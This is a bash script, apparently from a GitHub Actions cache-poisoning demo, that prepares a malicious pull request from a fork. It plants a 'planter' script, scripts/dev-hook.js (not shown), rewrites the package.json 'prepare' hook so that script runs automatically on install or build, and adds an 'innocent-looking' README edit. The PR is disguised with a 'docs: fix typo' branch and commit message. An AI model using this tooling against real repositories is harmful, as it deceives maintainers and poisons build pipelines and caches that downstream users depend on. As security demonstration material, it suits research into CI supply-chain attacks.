#!/usr/bin/env bash
# Apply the attack files to a fresh fork. Run from the fork's repo root.
#
#   git clone https://github.com/<attacker-account>/gh-actions-demo-cache-poisoning fork
#   cd fork
#   git checkout -b docs/fix-typo
#   bash /path/to/attack/fork-changes/apply-attack.sh
#   git add -A && git commit -m "docs: fix typo in README"
#   git push origin docs/fix-typo
#   # then open the PR

set -euo pipefail

REPO_ROOT="$(pwd)"
ATTACK_DIR="$(cd "$(dirname "$0")" && pwd)"

# 1. Add the planter script.
mkdir -p "$REPO_ROOT/scripts"
cp "$ATTACK_DIR/scripts/dev-hook.js" "$REPO_ROOT/scripts/dev-hook.js"

# 2. Modify the prepare hook in package.json (preserves indentation/formatting).
node -e '
  const fs = require("fs");
  const path = require("path");
  const pkgPath = path.resolve("package.json");
  const txt = fs.readFileSync(pkgPath, "utf8");
  if (txt.includes("dev-hook.js")) {
    console.log("package.json already modified, skipping");
    process.exit(0);
  }
  const modified = txt.replace(
    /"prepare":\s*"npm run build"/,
    "\"prepare\": \"node scripts/dev-hook.js && npm run build\""
  );
  if (modified === txt) {
    console.error("FAIL: could not find prepare hook to modify");
    process.exit(1);
  }
  fs.writeFileSync(pkgPath, modified);
  console.log("modified package.json prepare hook");
'

# 3. Tiny innocent-looking README diff so the PR has a visible reason.
if grep -q "FIXME" README.md 2>/dev/null; then
  sed -i.bak 's/FIXME/(fixed)/' README.md && rm README.md.bak
fi

echo
echo "Attack files applied. Now:"
echo "  git add -A"
echo "  git commit -m 'docs: fix typo in README'"
echo "  git push origin docs/fix-typo"
echo "  # then open the PR against the upstream main branch"
